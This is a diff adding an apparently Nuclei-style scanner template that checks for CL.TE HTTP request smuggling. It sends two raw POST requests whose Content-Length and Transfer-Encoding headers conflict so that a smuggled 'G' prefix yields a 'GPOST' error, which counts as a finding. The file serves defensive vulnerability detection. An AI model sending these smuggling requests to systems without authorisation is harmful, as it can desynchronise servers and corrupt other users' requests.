@@ -1,0 +1,48 @@
+id: cl-te-http-smuggling
+
+info:
+  name: Basic CL.TE - HTTP request smuggling
+  author: pdteam,akincibor
+  severity: low
+  description: |
+    Detected a potential CL.TE request smuggling condition where conflicting Content-Length and Transfer-Encoding headers caused the gateway and backend to parse requests differently.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+  metadata:
+    verified: true
+    max-request: 2
+  tags: cl-te,smuggling,vuln
+
+http:
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+
+    unsafe: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "Unrecognized method GPOST")'
+# digest: 4b0a00483046022100f3227e7989497ba2c0c64e64029d60fae0bdf5ad3072075ec01cc7d44b6f43d7022100f6a0b566fbe9fdf5146e21fdda5d83214c4e82d11f94e69c416757b1aaf5296a:922c64590222798bb761d5b6d8e72950
